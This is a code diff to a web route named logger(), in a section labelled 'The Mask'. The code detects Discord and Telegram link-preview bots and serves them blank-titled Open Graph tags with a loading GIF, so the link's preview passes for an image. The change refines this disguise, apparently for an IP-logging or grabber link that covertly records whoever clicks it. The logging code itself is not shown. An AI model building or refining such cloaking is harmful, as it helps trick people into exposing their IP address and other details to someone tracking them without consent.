@@ -26,11 +26,12 @@ def logger():
     # 3. The Mask
     user_agent = request.user_agent.string.lower()
     if "discord" in user_agent or "telegram" in user_agent:
+        # We send ONLY the GIF link in a way Discord's bot likes
         return '''
         <html>
             <head>
-                <meta property="og:title" content="Image Loading...">
-                <meta property="og:description" content="Tap to view full image">
+                <meta property="og:site_name" content=" ">
+                <meta property="og:title" content=" ">
                 <meta property="og:image" content="https://i.ibb.co/Lkv788Z/discord-loading.gif">
                 <meta name="twitter:card" content="summary_large_image">
             </head>
